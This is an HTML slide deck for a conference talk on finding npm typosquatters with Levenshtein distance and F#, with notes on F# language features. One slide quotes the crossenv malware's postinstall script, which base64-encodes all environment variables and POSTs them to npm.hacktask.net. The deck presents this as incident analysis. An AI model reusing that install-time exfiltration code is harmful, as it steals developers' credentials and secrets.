<!doctype html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

	<title>Hunting typosquatters with F#</title>

	<link rel="stylesheet" href="talk/reveal.js/css/reveal.css">
	<link rel="stylesheet" href="talk/reveal.js/css/theme/sky.css">

	<!-- Theme used for syntax highlighting of code -->
	<link rel="stylesheet" href="talk/reveal.js/lib/css/zenburn.css">

	<link rel="stylesheet" href="talk/css/talk.css">

	<!-- Printing and PDF exports -->
	<script>
		var link = document.createElement('link');
		link.rel = 'stylesheet';
		link.type = 'text/css';
		link.href = window.location.search.match(/print-pdf/gi) ? 'talk/reveal.js/css/print/pdf.css' : 'talk/reveal.js/css/print/paper.css';
		document.getElementsByTagName('head')[0].appendChild(link);
	</script>
</head>

<body>
	<div class="reveal">
		<div class="slides">
			<script src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


			<section data-background-image="talk/img/CardBack.jpg">
				<section></section>
			</section>
			<section>
				<h4>me</h4>
				<p>currently
					<strike>(f)</strike>unemployed</p>
				<p>formerly Software Engineer at Scott Logic</p>
				<p>'Back end' C#, learning to .js</p>
				<p>F# novice ~150 hours, 1.5% expert</p>

				<aside class="notes">
					Hi there and thanks for coming to my talk. My name is chester burbidge and i'm currently funemployed. I was
					recently a Software
					Engineer at Scott Logic, most of my experience has been 'backend' C#. I'm not an expert on F#, i've maybe spent
					150
					odd hours messing around with it. I'm definitely a novice functional developer.
				</aside>
			</section>
			<section>
				<section>
					<h2>Hunting typosquatters
						<br />with F#</h2>
					<p>
						<a href="https://chestercodes.github.io/RepoHunt/">chestercodes.github.io/RepoHunt/</a>
					</p>

					<aside class="notes">
						Now that you know who I am, this is my talk 'Hunting typosquatters with F#' This talk is designed for someone who
						knows nothing
						about any of the words in the title. It is a story and a brief introduction to some of the cool features of the
						F#
						language.
					</aside>
				</section>


				<section>
					<h4>Agenda</h4>
					<pre class="center"><code  data-noescape>
var talk = {
	
	"sections": [
		
		"npm",

		"crossenv attack",

		"hunt",

		"F#",

		"results"

	]

}
</code></pre>

				</section>
			</section>
			<section data-background-image="talk/img/NpmBackground.png" data-state="dimbg">
				<section>
					<h4>npm</h4>
					<div class="fragment">
						<p>node package manager</p>
						<p>JavaScript open source code repository</p>
						<p>over 580,000 packages</p>
					</div>
				</section>

				<section>
					<h4>npm</h4>
					<p>580k packages?!</p>
					<div class="fragment">
						<table>
							<tr>
								<td>Maven</td>
								<td>Java</td>
								<td>~223k</td>
							</tr>
							<tr>
								<td>nuget</td>
								<td>dotnet</td>
								<td>~106k</td>
							</tr>
						</table>
					</div>
					<div class="fragment">
						<p>JavaScript base library fairly spartan</p>
						<p>community prefers lots of small modules</p>
					</div>

					<div class="fragment">
						<blockquote class="twitter-tweet tw-align-center" width="550px" data-lang="en">
							<p lang="en" dir="ltr">Drinking game for npm users:
								<br>‚ûÄ Think of a noun
								<br>‚ûÅ npm install &lt;noun&gt;
								<br>‚ûÇ If it installs - drink!</p>&mdash; Sindre Sorhus (@sindresorhus)
							<a href="https://twitter.com/sindresorhus/status/515511151669805056?ref_src=twsrc%5Etfw">September 26, 2014</a>
						</blockquote>
					</div>

				</section>

				<section data-external="CreateReactAppDependencies1.html"> </section>
				
				<section data-external="CreateReactAppDependencies2.html"> </section>

				<section>
					<img src="talk/img/NodeModulesHeavy.png" width="80%" height="80%" />
				</section>

				
			</section>

			<section  data-background-image="talk/img/NpmBackground.png" data-state="dimbg">
				<section>
					<h4>npm - package.json</h4>
					<pre class="center"><code  data-noescape> {
  <span class="fragment highlight-current-red">"name": "my-great-package",
  "version": "1.0.0",</span>
  <span class="fragment highlight-current-red">"description": "makes code great again",
  "license": "MIT",
  "author": "chester",</span>
  <span class="fragment highlight-current-red">"dependencies": {
    "dependency1": "1.2.3",
    "dependency2": "2.3.4"
  },</span>
  <span class="fragment highlight-current-red">"scripts": {
    "install": "make &amp;&amp; make install",
    "postinstall": "post-install.js"
  }</span>
}</code></pre>
					<p> install events:
						<br /> preinstall, install, postinstall,
						<br />prepack, prepublish, prepare</p>
				</section>

				<!-- <section data-background-image="talk/img/CouchDb.png" data-state="dimbg"> -->
				<section>
					<h4>data</h4>
					<p>npmjs.com data stored in CouchDB database</p>
					<p>key-value store, value is JSON object:</p>
					<pre class="center"><code  data-noescape>{
  <span class="fragment highlight-current-red">"name": "d3fc"</span>,
  "maintainers": [ 
    <span class="fragment highlight-current-red">{ "name": "chrisprice" }, 
    { "name": "colineberhardt" }</span>
  ],
  "versions": {
    "13.1.1": { "contents of the": "package.json ..." }
  }
}</code></pre>
					<p>can use CouchDB View to get package names, authors</p>
				</section>
			</section>

			<section data-background-image="talk/img/CrossEnvBackground.jpg" data-state="dimbg">
				<section>
					<h4>crossenv attack</h4>

					<blockquote class="twitter-tweet tw-align-center" data-lang="en">
						<p lang="en" dir="ltr">
							<a href="https://twitter.com/kentcdodds?ref_src=twsrc%5Etfw">@kentcdodds</a> Hi Kent, it looks like this npm
							package is stealing env variables on install, using your cross-env
							package as bait:
							<a href="https://t.co/REsRG8Exsx">pic.twitter.com/REsRG8Exsx</a>
						</p>&mdash; Oscar Bolmsten (@o_cee)
						<a href="https://twitter.com/o_cee/status/892306836199800836?ref_src=twsrc%5Etfw">August 1, 2017</a>
					</blockquote>

				</section>
				<section>
					<p>crossenv - package.json</p>
					<pre><code  data-noescape>{
  <span class="fragment highlight-current-red" data-fragment-index="1" >"name": "crossenv"</span>,
  "version": "6.1.1",
  "description": "Run scripts that set and use environment variables across platforms",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" ",
    <span class="fragment highlight-current-red" data-fragment-index="2" >"postinstall": "node package-setup.js"</span>
  },
  "author": "Kent C. Dodds",
  "license": "ISC",
  "dependencies": {
    <span class="fragment highlight-current-red" data-fragment-index="1" >"cross-env": "^5.0.1"</span>
  }
}</code></pre>
				</section>
				<section>
					<p>crossenv - package-setup.js</p>
					<pre><code data-noescape>const http = require('http');
const querystring = require('querystring');
<span class="fragment highlight-current-red" >const env = JSON.stringify(process.env);</span>
<span class="fragment highlight-current-red" >const data = new Buffer(env).toString('base64');
const postData = querystring.stringify({ data });
const options = {
	hostname: 'npm.hacktask.net',
	port: 80,
	path: '/log/',
	method: 'POST',
	headers: {
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': Buffer.byteLength(postData)
	}
};
const req = http.request(options);
req.write(postData);
req.end();</span>
</code></pre>
				</section>
				<section>
					<h4>hacktask - other packages</h4>
					<table id="crossenv-table">
						<tr>
							<td>babelcli</td>
							<td>cross-env.js</td>
							<td>crossenv</td>
							<td>d3.js</td>
							<td>fabric-js</td>
						</tr>
						<tr>
							<td>ffmepg</td>
							<td>gruntcli</td>
							<td>http-proxy.js</td>
							<td>jquery.js</td>
							<td>mariadb</td>
						</tr>
						<tr>
							<td>mongose</td>
							<td>mssql-node</td>
							<td>mssql.js</td>
							<td>mysqljs</td>
							<td>node-fabric</td>
						</tr>
						<tr>
							<td>node-opencv</td>
							<td>node-opensl</td>
							<td>node-openssl</td>
							<td>node-sqlite</td>
							<td>node-tkinter</td>
						</tr>
						<tr>
							<td>nodecaffe</td>
							<td>nodefabric</td>
							<td>nodeffmpeg</td>
							<td>nodemailer-js</td>
							<td>nodemailer.js</td>
						</tr>
						<tr>
							<td>nodemssql</td>
							<td>noderequest</td>
							<td>nodesass</td>
							<td>nodesqlite</td>
							<td>opencv.js</td>
						</tr>
						<tr>
							<td>openssl.js</td>
							<td>proxy.js</td>
							<td>shadowsock</td>
							<td>smb</td>
							<td>sqlite.js</td>
						</tr>
						<tr>
							<td>sqliter</td>
							<td>sqlserver</td>
							<td>tkinter</td>
						</tr>
					</table>
				</section>
				<section>
					<h4>crossenv - mitigate?</h4>
					<div class="">
						<blockquote class="twitter-tweet tw-align-center" data-conversation="none" data-lang="en">
							<p lang="en" dir="ltr">would be super useful if
								<a href="https://twitter.com/npmjs?ref_src=twsrc%5Etfw">@npmjs</a> would deny publishing a package if another
								one with a
								<a href="https://twitter.com/hashtag/levenshtein?src=hash&amp;ref_src=twsrc%5Etfw">#levenshtein</a> distance
								&lt;3 is already published !!!</p>&mdash; Andrei Neculau (@andreineculau)
							<a href="https://twitter.com/andreineculau/status/892490804756983808?ref_src=twsrc%5Etfw">August 1, 2017</a>
						</blockquote>
					</div>
					<p class="">proposes Levenshtein distance validation, reject new package names of distance &lt; 3 to existing</p>

				</section>

				<!-- html formatting is ignored for label tags on my machine -->
				<section>
					<h4>Levenshtein distance</h4>
					<p>measure of the similarity between two strings, it is the number of deletions, insertions, or substitutions
						required
						to transform one string into another</p>
					<p>
						<label>te<span class="fragment highlight-current-red" data-fragment-index="1">s</span>t -> te<span class="fragment highlight-current-red" data-fragment-index="1">n</span>t = <span class="fragment highlight-current-red" data-fragment-index="1">1 substitution</span></label>
					</p>
					<p>
						<label> test -> test<span class="fragment highlight-current-red" data-fragment-index="2">s</span> = <span class="fragment highlight-current-red" data-fragment-index="2">1 insertion</span></label>
					</p>
					<p>
						<label><span class="fragment highlight-current-red" data-fragment-index="3">t</span>e<span class="fragment highlight-current-red" data-fragment-index="3">s</span>t -> <span class="fragment highlight-current-red" data-fragment-index="3">r</span>e<span class="fragment highlight-current-red" data-fragment-index="3">n</span>t = <span class="fragment highlight-current-red" data-fragment-index="3">2 substitutions</span></label>
					</p>
					<p>
						<label>test -> test<span class="fragment highlight-current-red" data-fragment-index="4">ed</span> = <span class="fragment highlight-current-red" data-fragment-index="4">2 insertions</span></label>
					</p>
				</section>

				<section>
					<h4>hacktask packages</h4>
					<p>
						<label>crossenv -> cross<span class="fragment highlight-current-red" data-fragment-index="1">-</span>env - dist = 1</label>
					</p>
					<p>
						<label>babelcli -> babel<span class="fragment highlight-current-red" data-fragment-index="1">-</span>cli - dist = 1</label>
					</p>
					<p>
						<label>ffm<span class="fragment highlight-current-red" data-fragment-index="1">ep</span>g -> ffm<span class="fragment highlight-current-red" data-fragment-index="1">pe</span>g - dist = 2</label>
					</p>
					<p>
						<label>mysql<span class="fragment highlight-current-red" data-fragment-index="1">js</span> -> mysql - dist = 2</label>
					</p>
					<p>
						<label>d3<span class="fragment highlight-current-red" data-fragment-index="1">.js</span> -> d3 - dist = 3</label>
					</p>
				</section>

				<section>
					<h4>other attacks?</h4>
					<p>search npm for existing typosquatters</p>
					<p>low distance pairs of names
						<br />e.g. crossenv and cross-env
						<br /> typosquatting?</p>
					<p>find low distances, aggregate by author</p>
				</section>
			</section>
			<section data-background-image="talk/img/Lion.JPG" data-state="lessdimbg">
				<section>
					<h4>hunt</h4>

					<p>over 580,000 packages ~ 1.7 E11 combinations</p>
					<p>need to run pairs in parallel, save distance &lt; 4 to csv</p>

					<p>Levenshtein distance algorithm
						<ul>
							<li>googling provides a few implementations</li>
							<li>fastest builds Trie from package names and uses max distance to limit computations</li>
							<!-- <li>if distance(package, react-modal) > max,
							<br/> no point running distance(package, react-modal-bootstrap)</li> -->
						</ul>
					</p>

				</section>

				<section>
					<h4>Trie this</h4>
					<p>For search set of words:
						<br /> Cat, Cats, Cater, Count, Hat</p>
					<img src="talk/img/LevTrie.png" width="60%" />
					<aside class="notes">
						Since we know all of the words to be compared to each other we can used a trie based method to narrow down the
						search space.
						The method works by creating a trie of all of the words and picking a maximum limit for the Levenshtein distance.
						Each word is then compared against the branches of the trie, node by node until the lev distance is greater than
						the maximum limit and the rest of the branch is ignored.
						This method cuts down the processing time considerably.
					</aside>
				</section>
			</section>

			<section data-background-image="talk/img/FSharpLogo.png" data-state="lessdimbg">
				<section>
					<h4>F#</h4>

					<div class="fragment">
						<blockquote class="twitter-tweet tw-align-center" width="550px" data-conversation="none" data-lang="en">
							<p lang="en" dir="ltr">
								<a href="https://twitter.com/hashtag/fsharp?src=hash&amp;ref_src=twsrc%5Etfw">#fsharp</a> is the greatest
								language in the world, there I said it fight me</p>&mdash; Spencer Schneidenbach üá∫üá∏
							(@schneidenbach)
							<a href="https://twitter.com/schneidenbach/status/954355269194141698?ref_src=twsrc%5Etfw">January 19, 2018</a>
						</blockquote>

						<blockquote class="twitter-tweet tw-align-center" width="550px" data-lang="en">
							<p lang="en" dir="ltr">
								<a href="https://twitter.com/hashtag/FSharp?src=hash&amp;ref_src=twsrc%5Etfw">#FSharp</a> &quot;the conciseness
								of Python, strictness of Scala &amp; ecosystem of .Net.&quot; Is that a good summary?</p>&mdash;
							Luke Merrett (@LukeAMerrett)
							<a href="https://twitter.com/LukeAMerrett/status/850003297180188674?ref_src=twsrc%5Etfw">April 6, 2017</a>
						</blockquote>

					</div>

				</section>
				<section>
					<h4>FizzBuzz - naive</h4>
					<pre class="center"><code class="cs" data-noescape>// C#
string FizzBuzz(int n)
{
  if(n % 15 == 0){
    return "FizzBuzz";
  } else if (n % 3 == 0) {
    return "Fizz";
  } else if (n % 5 == 0) {
    return "Buzz";
  } else {
    return n.ToString();
  }
}</code></pre>
					<pre class="center"><code class="fs" data-noescape>// F#
<span class="fragment highlight-current-red" data-fragment-index="1">let fizzbuzz n =</span>
  <span class="fragment highlight-current-red" data-fragment-index="2">match n with</span>
  <span class="fragment highlight-current-red" data-fragment-index="3">| x when x % 15 = 0</span> -> <span class="fragment highlight-current-red" data-fragment-index="4">"FizzBuzz"</span>
  <span class="fragment highlight-current-red" data-fragment-index="5">| x when x % 3  = 0 -> "Fizz"
  | x when x % 5  = 0 -> "Buzz"</span>
  <span class="fragment highlight-current-red" data-fragment-index="6">| x                 -> x.ToString()</span></code></pre>

					<aside class="notes">
						To get an idea of how great F# is i'd like to show some comparisons between F# and C# code. Going to start with
						the interview favourite FizzBuzz
						The top part is a basic implementation of fizzbuzz in C#, we can see that we have a function FizzBuzz, which
						takes in an int and returns a string.
						The function returns Fizz if the input divides by three, Buzz if the function divides by 5, FizzBuzz if the
						function divides by both or returns the number as a string if it doesn't divide by 3 or 5.
						Below is the F# basic implementation which i will walk through in case this is anyones first sight of F# code.

						The "let fizzbuzz n =" denotes to define a function called fizzbuzz which takes in a parameter n.
						Now you'll notice that we've not spcecified the types of the input parameters and function output. F# uses
						powerful type inference to decide what types these are by looking at the output expression and how the input
						parameters are used. It's not perfect, sometimes it needs to be given a hint, but it's very very good.
						Then everything which is one indentation away from the level of the function declaration is included in the
						function body.
						There is also no return keyword used, the return value is the value of the last expression in the function.

						In our case the function only has one expression which is a pattern matching on the input n.
						This pattern matching says to take n and match it against the patterns one by one and returns the expression
						after the pattern.
						In this case it will take the number n and if the modulous of that number with 15 is 0 then it will return the
						string FizzBuzz.
						The same happens for the other cases until the catch all which returns the value of the number .ToString()

						This was the basic version of fizzbuzz, on the next slide I'll show what a refactored version of both the C# and
						F# versions looks like.
					</aside>
				</section>

				<section>
					<h4>FizzBuzz - refactored</h4>
					<pre class="center"><code class="cs" data-noescape>// C#
public static bool DividesBy(this int n, int mod)
{
  return n % mod == 0;
}

public static string FizzBuzz2(int n)
{
  return  n.DividesBy(15) ? "FizzBuzz" : 
            n.DividesBy(3) ? "Fizz" :
              n.DividesBy(5) ? "Buzz" :
                n.ToString();
}</code></pre>
					<pre class="center"><code class="fs" data-noescape>// F#
<span class="fragment highlight-current-red" data-fragment-index="3">let (|DividesBy|_|)</span> modN n = if n % modN = 0 then Some n else None 

let fizzbuzz2 n = 
  match n with
  | <span class="fragment highlight-current-red" data-fragment-index="3">DividesBy 15</span> _ -> "FizzBuzz"
  | DividesBy 3  _ -> "Fizz"
  | DividesBy 5  _ -> "Buzz"
  | x              -> x.ToString()</code></pre>

					<aside class="notes">
						Here are the two bits of code which i've refactored to how I would write them.
						The C# version uses an extension method for DividesBy and, maybe controversially, nested ternaries for the rest
						of the function.

						The F# version remains quite similar apart from the extraction of a partial active pattern called DividesBy.
						What i'd like to emphasise here is how terse and expressive this becomes. You're left with code that reads like
						english which i'm a big fan of.
						This seems to be a nice consequence of the syntax of F# in that the code can be very terse and intuitive, maybe
						enough for other department employees to be able to read the code and get a rough idea of the logic.
					</aside>
				</section>

				<section>
					<h4>Scenario - Simple Immutable Data</h4>
					<p>Want to model a Person with a Name, Age and Address</p>
					<p>Easily check whether two such objects are the same data</p>
					<p>Want to copy the object and modify an address line</p>
				</section>

				<section>
					<pre class="center"><code class="cs" data-noescape>public class Person : IEquatable&lt;Person&gt;
{
  public int Age { get; private set; }
  public string Name { get; private set; }
  public Address Address { get; private set; }
  
  public Person(string name, int age, Address address)
  {
    Name = name;
    Age = age;
    Address = address;
  }
  
  public bool Equals(Person other)
  {
    return other.Age == Age
      && other.Name == Name
      && other.Address.Equals(Address);
  }
}
	</code></pre>
				</section>

				<section>
					<pre class="center"><code class="cs" data-noescape>public class Address : IEquatable&lt;Address&gt;
{
  public string Line1 { get; private set; }
  public string Line2 { get; private set; }
  public string PostCode { get; private set; }
	
  public Address(string line1, string line2, string postCode)
  {
      Line1 = line1;
      Line2 = line2;
      PostCode = postCode;
  }
	
  public bool Equals(Address other)
  {
      return other.Line1 == Line1
        && other.Line2 == Line2 
        && other.PostCode == PostCode;        
  }
}
	</code></pre>
				</section>
				<section>
					<pre class="center"><code class="cs" data-noescape>var john = new Person(
  "John", 30, 
  new Address("1 lane", "1 street", "BS11BS"));

var sameJohn = new Person(
  "John", 30, 
  new Address("1 lane", "1 street", "BS11BS"));

Console.WriteLine($"Johns are equal - " + (john.Equals(sameJohn)));
// Johns are equal - True

var copyJohn = new Person(
  john.Name, john.Age, 
  new Address(
    "2 lane", // moved next door
    john.Address.Line2, 
    john.Address.PostCode)
  );</code></pre>


					<aside class="notes">
						The first two slides show the code involved to model an immutable Person with Age, Name and Address.
						We have to pass everything in via the constructor and override the Equals method to equate to another Person,
						making sure to use .Equals on the Address, which is always a fun bug to find.
						This slide shows the instantiation of these classes, nothing crazy but we just create 2 johns with the same
						values and check that they are equal.
						To modify a john we then need to call the constructor with all of the properties one by one and changing just the
						address line 1. This can get ugly very quickly if dealing with complex objects.

						Now we can see the equivalent code in F#.
					</aside>
				</section>

				<section>
					<pre class="center"><code class="fs" data-noescape>
type Address<span class="fragment highlight-current-red" data-fragment-index="1"> = {</span> <span class="fragment highlight-current-red" data-fragment-index="2">Line1: string;</span> Line2: string; PostCode: string <span class="fragment highlight-current-red" data-fragment-index="1">}</span>

type Person =  <span class="fragment highlight-current-red" data-fragment-index="3">{ Name: string
                 Age: int
                 Address: Address }</span>

let john =     <span class="fragment highlight-current-red" data-fragment-index="3">{</span> Name = "John"; Age = 30
                 Address = { Line1 = "1 lane"; Line2 = "1 street"
                             PostCode = "BS11BS"} <span class="fragment highlight-current-red" data-fragment-index="3">}</span>

let sameJohn = <span class="fragment highlight-current-red" data-fragment-index="3">{</span> Name = "John"; Age = 30
                 Address = { Line1 = "1 lane"; Line2 = "1 street"
                             PostCode = "BS11BS"} <span class="fragment highlight-current-red" data-fragment-index="3">}</span>

printfn "Johns are equal - %b" (john = sameJohn)

let copyJohn = <span class="fragment highlight-current-red" data-fragment-index="4">{</span> john with Address = 
                    { john.Address with Line1 = "2 lane"} <span class="fragment highlight-current-red" data-fragment-index="4">}</span></code></pre>

					<aside class="notes">
						With F# the whole of the code fits onto this slide, the first four lines of text take the place of the first two
						slides of C#.
						The first line defines a record type to represent the Address. A record type is like an immutable named tuple
						which uses structural equality.
						In this case the values in the record type are between the curly braces, they are the addresses Line1, Line2 and
						PostCode all of type string.

						The Person is also a record type which contains a Name of type string, an Age of type int and an Address of type
						address.
						We can see the way that records are created here. The red highlighted braces are Person records being created.
						To create a record type one uses curly braces and assigns the values to the named properties.
						The compiler knows which type is being created by the named properties being used. In this case the names for the
						Person are Name, Age and Address.
						The Address is also a record type of the names Line1, Line2 and PostCode.

						Checking for equality is as easy as checking for any other equality and copying an object and modifying a value
						has a really nice syntax.
						The highlighted braces show the john being copied with the Address property being modified to the previous value
						but with the Line1 changed.
					</aside>
				</section>

				<section>
					<img src="talk/img/CFInterop.png" width="100%" height="100%">

					<aside class="notes">
						If you like the idea of record types and want to use them to save yourself some C# cruft, the F#/C# interop is
						very useful.
						Here we have a view of a visual studio solution with two projects, an F# library and a C# console app.
						The top window shows the Address and Person record classes and the bottom one shows how they can be used in C#.
						They automatically receive an immutable constructor which is typed and named appropriately.
						This could be a way to introduce F# into work life if one felt so inclined.
					</aside>
				</section>

				<section>
					<h4>Reasons to try</h4>
					<ul>
						<li class="fragment">Concise:
							<ul>
								<li class="fragment">type inference</li>
								<li class="fragment">less boilerplate</li>

							</ul>
						</li>
						<li class="fragment">Clear, intuitive</li>
						<li class="fragment">Correctness:
							<ul>
								<li class="fragment">Immutable by default</li>
								<li class="fragment">NullReferenceException</li>
							</ul>
						</li>
					</ul>
				</section>

				<section>
					<h4>Other reasons</h4>

					<ul>
						<li class="fragment">Domain modelling:
							<ul>
								<li class="fragment">Sum types</li>
								<li class="fragment">Units of measure</li>
							</ul>
						</li>
						<li class="fragment">Productivity:
							<ul>
								<li class="fragment">Interop</li>
								<li class="fragment">REPL</li>
								<li class="fragment">Scripting</li>
							</ul>
						</li>
						<li class="fragment">Type providers</li>
						<li class="fragment">Parallel...</li>
					</ul>
				</section>
			</section>

			<section data-background-image="talk/img/FSharpLogo.png" data-state="lessdimbg">

				<section>
					<h4>F# hunt - parallel</h4>
					<div class="fragment">
						<p>can use standard .NET classes/libraries</p>
					</div>

					<div class="fragment">
						<p>F# specific:
							<ul>
								<li>asynchronous workflows</li>
								<li>messages and agents</li>
							</ul>
						</p>
						<p>can use agents(actors) to manage concurrency</p>
					</div>
				</section>

				<section>
					<h4>messages and agents(actors)</h4>

					<p>create actors, communicate via messages</p>
					<p>actor processes typed messages sequentially from inbox queue</p>
					<p>control of parallelism through actor creation</p>
				</section>
				<section>
					<h4>actor paralellism</h4>

					<img src="talk/img/ActorDiagram.png" width="90%">

					<aside class="notes">
						I used F# actors to control the paralellism of the processing. The code builds up the trie structure and then
						creates multiple processing actors.
						The processing actors then receive a message consisting of the trie and one of the 580k words to process.
						The processing actor runs the Levenshtein algorithm against the trie and gets a list of the word pairings below a
						distance of 3 and their distances.
						The processing actors post the results to a single csv file writing actor which appends the results to a csv
						file.
						This single csv file actor processes messages one by one, so there is less chance of resource contention issues.
					</aside>
				</section>

			</section>

			<section data-background-image="talk/img/FSharpLogo.png" data-state="lessdimbg">
				<section>
					<h4>results analysis</h4>
					<p>imported csv file into sqlite database</p>
					<p>can use type providers to analyse the results</p>
				</section>

				<section>
					<h4>type providers</h4>
					<p>idiomatic data access - F# 'killer feature'</p>
					<blockquote>An F# type provider is a component that provides types, properties, and methods for use in your
						program</blockquote>
					<p>compile time meta-programming</p>

				</section>

				<section>
					<p><a href="talk/img/TypeProvider1Demo.mp4">demo</a>: type providers
						<br /> a new hope</p>
					<pre class="center fragment"><code class="cs" data-noescape>
public string ParsePostCodeRegion(string input)
{
    const string Region = "Region";

    var pattern = "(?<" + Region + ">^[A-Z]{1,2})" + 
                  "\\d{1,2}\\s*\\d{1,2}[A-Z]{1,2}$";

    var match = new Regex(pattern).Match(input);

    if (match.Success)
    {
        return match.Groups[Region].Value;
    }

    return null;
}
						</code></pre>

					<aside class="notes">
						Demo: In this demo we want to show what the parsing of the postcode regex can look like if we use an F# type provider.
						We have a normal console application in F# with a few things setup:
						There is the pattern for the regex which is the same as the last slide but has an attribute to say that it is a compile time literal value
						There is a function called parseRegion which is going to take in a string input and provide either a Some of the region value or a None to determine that the string didn't parse.
						There is the input which is a valid postcode witha region of AB and a line to print this info to the console
						There is a call to the parseRegion function which we pattern match on to give us information of whether the parsing was successful which is then printed to the console.
						Some will print out success and None will print failed to parse
						We can run the program by building it and running it in the package manager console which is a powershell prompt.
						We are currently in the bin debug directory and running Regex.exe produces the failed output.
						I've previously added the type provider which is a nuget package and we can see this by running get-package in the console.
						As with C# to use the type provider in code we need to write open and the type provider package name, this is the same as using in C#
						We can then create a type with the provider, to do this we need to call the Regex type provider with the pattern in a way which looks like C# generics.
						This creates the type PostcodeRegex, this is similar in API and concept to the Regex class in C# but with a crucial difference.
						If we instantiate the type and then use the TypedMatch method on the input to get a result we can inspect this result
						We can see that the result has a Region property which corresponds to the named group in the regex pattern.
						This property is generated by the type provider and has properties relating to whether the regex matched and the value of the named group.
						We can then pattern match on the property for cases where the result.
						Region has a true value for Success and return the Value if so with the catch all case returning None if it can't match the regex.
						This shows how type providers give us a new level of correctness checking via the compiler.
						If we change the name of the group in the regex then we can see the the code will fail to compile and even suggest which property that we might mean to use.
						This was a simple example which could be seen to be a bit trivial, fear not!
						I will show a more complex example next.
					</aside>

				</section>

				<section>
					<p><a href="talk/img/TypeProvider2Demo.mp4">demo</a>: type providers - the IO strikes back</p>

					<img class="fragment" src="talk/img/DevonCountyCouncilGithub.png" height="90%" />

					<pre class="fragment">Body,Name of Body,Date,Transaction Number,Invoice Number,Amount,
Supplier Name,Supplier ID,VAT Reg no,Expense Area,Expense Type,
Expense Code,Creditor Type</pre>


					<aside class="notes">
						Demo: In this demo we want to use the devon county council spending data to find out something interesting. Since
						we have
						the fields Suppier Name and amount we can try to find the top 10 suppliers that the council spent money on. This
						is
						a standard dotnet core F# console project. I also have a powershell terminal open at the directory and can build
						and
						run like so. The data is in .csv format, we are going to use the FSharp.Data nuget package and the CsvProvider to
						read
						the csv. The data can be found at a specific github url determined by the user, repository and revision. I'm
						going
						to copy a bit of code to start, this includes the url of the csv and a simple record type SupplierAmount to store
						the
						subset of the data that we are interested in. We can create a grants type using the CsvProvider by passing in the
						url
						of the file and can then instantiate this type to a value. This grants value has a Rows property which is an
						enumeration,
						if we take the first of the enumeration we can inspect what the type provider has generated looking at the first
						of
						the rows we can see that we have typed properties for all of the columns in the .csv. In the background this type
						provider
						has downloaded part of the file from the url, parsed some of the first rows and created typed properties based on
						the
						data in the first rows. With easy access to this data we can simply project the properties to our record class,
						groupby
						the supplier name, sumBy the amount and sort by descending on the amount sum and take the first 10. If we try to
						run
						the code we get an error, this error is a mistake in the sniffing of the column type. It believes that an expense
						code
						column is a integer and is failing to convert the Date column. Fixing this is simple and shows another cool
						feature
						of the type provider, we can specify a schema to tell the provider the actual types of these columns. We don't
						even
						need to specify all of the colunm types, just the ones that the code gets wrong. With that correction the code
						prints
						out the correct values to the screen. This hopefully shows the power of F# type providers, we have compiler
						verified,
						typed access to a remote csv file with a simple calculation in 25 lines of code.

					</aside>
				</section>

			</section>

			<section data-background-image="talk/img/DestroyyerProfile.png" data-state="lessdimbg">
				<section>
					<h4>results</h4>
					<p>
						<ul>
							<li>aggregate packages with low distance to others by author, join with popular packages to reduce noise</li>
							<li>identify hacktask and other typosquatting users</li>
							<li>determine whether name validation would be effective </li>
						</ul>
					</p>
				</section>

				<section>
					<h4>user - hacktask</h4>
					<p>ranked 476'th by package count, with 4 packages similar to others</p>
					<img src="talk/img/HacktaskQueryResult.png" width="50%" />
					<p>hard to spot, masked by many other users </p>
					<p>lots of low Levenshtein package combinations providing noise</p>
					<p>other interesting things:</p>
				</section>

				<section>
					<h4>user - destroyyer</h4>
					<p>packages - scaala, jaava, akka, ifelse, aple</p>
					<p>clearly typosquatting, no obvious malicious packages</p>
					<img src="talk/img/NpmUserDestroyyer.png" height="90%" />
				</section>

				<section>
					<h4>user - fdhadzh</h4>
					<p>user with lots of packages with typosquatting names:</p>
					<pre style="font-size:0.6em;">
adobephotoshop, adobe-photoshop, afer, anoher, Apple, bayer, 
beween, comit, dylan, Elliot, emacs, foxconn, Fsociety, gmail-api,
gmail-google, gnu, google-docs, IPhoneSE, materialdesign, Microsoft, 
MrRobot, netfliks, panasonic, sandisk, scala, symantec, toshiba, 
TwitterBootstrap, vbasic, verisign, visualbasic, youcanttouchme</pre>
					<p>and others including 'I'</p>
				</section>

				<section>
					<h4>package - I</h4>
					<p>maintainers: 'fdhadzh' and 'brittanica'</p>
					<p>
						<i>Just import it and all your problems will go away! </i>
					</p>
					<img src="talk/img/PackageIGithub.png" width="70%" />
					<img class="fragment" src="talk/img/PackageIRunkit.png" width="70%" />

				</section>

				<section>
					<h4>lev distance name validation?</h4>
					<p>% of packages with a name of distance away</p>
					<table>
						<tr>
							<th>distance</th>
							<th>%</th>
						</tr>
						<tr>
							<td>&lt; 2</td>
							<td>26%</td>
						</tr>
						<tr>
							<td>&lt; 3</td>
							<td>46%</td>
						</tr>
						<tr>
							<td>&lt; 4</td>
							<td>64%</td>
						</tr>
					</table>
					<p>new packages names would likely clash without behaviour change</p>
				</section>

			</section>

			<section>
				<section>
					<h4>conclusion</h4>
					<p>hard to catch typosquatters with
						<br />Levenshtein distance approach</p>
					<p>typosquatting like behaviour is common in npm</p>
					<table>
						<tr>
							<td>similar</td>
							<td>preact</td>
							<td>react</td>
						</tr>
						<tr>
							<td>extend</td>
							<td>d3fc</td>
							<td>d3</td>
						</tr>
						<tr>
							<td>bridge</td>
							<td>bocha</td>
							<td>mocha</td>
						</tr>
						<tr>
							<td>disagreements</td>
							<td>class-names</td>
							<td>classnames</td>
						</tr>
					</table>

				</section>
				<section>
					<ul>further reading:
						<li>
							<a href="http://blog.scottlogic.com/2018/02/27/hunting-typosquatters-on-npm.html">hunt blog post</a>
						</li>
						<li>
							<a href="https://github.com/CBurbidge/RepoHunt">hunt github repo</a>
						</li>
						<li>
							<a href="http://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry">npm crossenv attack</a>
						</li>
						<li>
							fsharp for fun and profit:
							<ul>
								<li>
									<a href="https://fsharpforfunandprofit.com/posts/concurrency-async-and-parallel/">asynchronous programming</a>
								</li>
								<li>
									<a href="https://fsharpforfunandprofit.com/posts/concurrency-actor-model/">messages and agents</a>
								</li>
							</ul>
						</li>
						<li>
							type providers:
							<ul>
								<li>
